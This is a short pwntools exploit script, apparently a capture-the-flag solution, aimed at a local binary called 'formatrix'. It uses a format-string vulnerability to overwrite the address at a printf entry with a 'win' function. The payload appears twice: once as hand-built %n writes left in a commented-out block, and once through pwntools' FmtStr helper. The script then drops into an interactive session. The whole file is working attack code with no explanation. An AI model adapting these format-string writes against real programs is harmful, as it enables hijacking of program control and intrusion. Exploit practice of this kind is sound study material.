#!/usr/bin/python

from pwn import *

host = "127.0.0.1"
port = 7002

printf = 0x804b4bc
win = 0x080491f2

def send_ftm_payload(payload):
	print repr(payload)
	c.sendline(payload)

#c = remote(host, port)
c = process("../formatrix")
#c = gdb.debug("../formatrix")
c.recvlines(16)
'''
payload = p32(printf)
payload += p32(printf+1)
payload += p32(printf+2)
payload += p32(printf+3)
payload += "%226x"	# F2-16
payload += "%3$n"
payload += "%159x"	# 191-F2
payload += "%4$n"
payload += "%115x"	# 204-191
payload += "%5$n"
payload += "%260x"	# 308-204
payload += "%6$n"
'''
f = FmtStr(send_ftm_payload, offset=3)
f.write(printf, win)
f.execute_writes()

#print(payload)
#c.sendline(payload)

c.interactive()
